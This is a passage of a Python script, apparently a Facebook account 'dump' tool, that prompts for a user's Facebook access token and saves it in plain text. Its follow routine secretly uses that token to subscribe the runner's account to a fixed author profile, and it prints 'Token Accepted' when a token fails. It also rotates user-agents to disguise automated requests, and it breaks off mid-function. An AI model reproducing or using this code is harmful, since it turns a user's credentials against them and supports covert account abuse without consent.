#!/usr/bin/python
import os,re,sys,time,random,datetime,requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
logo = """
figlet Hamii | lolcat
"""
# Banner
___banner___ = ("""%s ____%s \n%s|  _ \ _   _ _ __ ___  _ __\n| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n|____/ \__,_|_| |_| |_| .__/
                      |_|   
                      
\033[1;91m _   _    __    __  __  ____  ____ 
\033[1;92m( )_( )  /__\  (  \/  )(_  _)(_  _)
\033[1;96m ) _ (  /(__)\  )    (  _)(_  _)(_ 
\033[1;91m(_) (_)(__)(__)(_/\/\_)(____)(____) 
"""%(H,P,H,B))

loop = 0
ok = []
cp = []

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
# Login
def ___login___():
    os.system('clear')
    print(___banner___)

    print("%s[%s!%s]%s USE TOKEN TO LOGIN %s{%sOpen%s}\n"%(H,P,H,P,H,K,H))
    try:
        ___token = input("%s[%s?%s]%s Token :%s "%(B,P,B,P,H))
        if ___token in ['open','Open']:
            print("%s[%s?*%s]%s Youtube!"%(K,P,K,P))
            os.system('xdg-open www.youtube.com/c/Hamiiworld')
            exit()
        else:
            ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']
            open('login.txt','w').write(___token)
            print("%s[%s*%s]%s Welcome :%s %s"%(H,P,H,P,K,___get))
            ___follow___()
    except (KeyError):
        print("%s[%s!%s]%s Token Accepted"%(M,P,M,P));sleep(3);___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s token Error"%(K,P,K,P))
# Bot Follow
def ___follow___():
    try:
        ___token = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(2);___login___()
    try:
        # Kalau Mau Di Ganti Izin Dulu!
        ___zed = datetime.datetime.now()
        ___waktu = ___zed.strftime('%A, %d %B %Y/%H.%M.%S')
        ___kata___ = random.choice(['AHN '])
        ___komen___ = ('I Love You @[100009521816069:] \n\n'+___kata___+'\n'+___waktu)
        ___komen2___ = ('I Love You @[100009521816069:]\n\n'+___kata___+'\n'+___waktu)
        ___komen3___ = random.choice(['Hello Have A Nyc Day'])
        requests.post('https://graph.facebook.com/100009521816069/subscribers?access_token=%s'%(___token)) #Hamii

    except:
        exit("%s[%s!%s]%s Login"%(M,P,M,P))
    print("%s[%s*%s]%s Login done"%(H,P,H,P))
    ___menu___()
# Daftar Menu
def ___menu___():
    try:
        ___token = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);___login___()
    try:
        ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']
        os.system('clear')
        print(___banner___)
        print("%s[%s•%s]%s Welcome :%s %s"%(H,P,H,
